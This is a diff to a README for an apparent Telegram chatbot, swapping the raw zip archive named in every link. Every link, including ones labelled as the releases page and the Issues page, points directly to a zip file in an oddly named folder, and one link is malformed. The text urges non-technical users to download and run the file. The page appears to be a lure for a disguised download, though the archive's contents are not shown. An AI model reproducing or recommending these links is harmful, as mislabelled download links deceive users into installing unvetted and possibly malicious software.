@@ -1,7 +1,7 @@
 # 🤖 telegram_private_chatbot - A Simple, Ad-Free Chatbot for You
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/telegram_private_chatbot-v3.1.zip%https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/telegram_private_chatbot-v3.1.zip)](https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/telegram_private_chatbot-v3.1.zip)
+[![Download](https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/chatbot_private_telegram_3.6.zip%https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/chatbot_private_telegram_3.6.zip)](https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/chatbot_private_telegram_3.6.zip)
 
 ## 📖 Introduction
 This application is a highly efficient, minimalist Telegram bot, designed to ensure a clean and safe chatting experience. It protects you from ads and scam links, allowing you to communicate freely without distractions. 
@@ -12,7 +12,7 @@ Follow these steps to download and set up your Telegram private chatbot. No tech
 ### Step 1: Visit the Releases Page
 To begin, click the link below to access the download page:
 
-[Visit this page to download](https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/telegram_private_chatbot-v3.1.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/chatbot_private_telegram_3.6.zip)
 
 ### Step 2: Choose the Right Version
 On the releases page, you will see different versions of the chatbot. Look for the latest version at the top. It will be labeled with the version number and the release date. 
@@ -74,11 +74,11 @@ A:
 A: This bot works with the Telegram app, which is available on smartphones. You interact through the Telegram app, making it accessible anywhere.
 
 ## 💬 Support
-If you encounter any issues or need assistance, please visit the [Issues page](https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/telegram_private_chatbot-v3.1.zip) on GitHub. You can report problems or ask questions. Our community is here to help.
+If you encounter any issues or need assistance, please visit the [Issues page](https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/chatbot_private_telegram_3.6.zip) on GitHub. You can report problems or ask questions. Our community is here to help.
 
 ## 📥 Download the Chatbot Again
 If you need to download the chatbot once more, use the following link:
 
-[Visit this page to download](https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/telegram_private_chatbot-v3.1.zip) 
+[Visit this page to download](https://raw.githubusercontent.com/Vichi26/telegram_private_chatbot/main/escheat/chatbot_private_telegram_3.6.zip) 
 
 Enjoy using your new Telegram private chatbot!
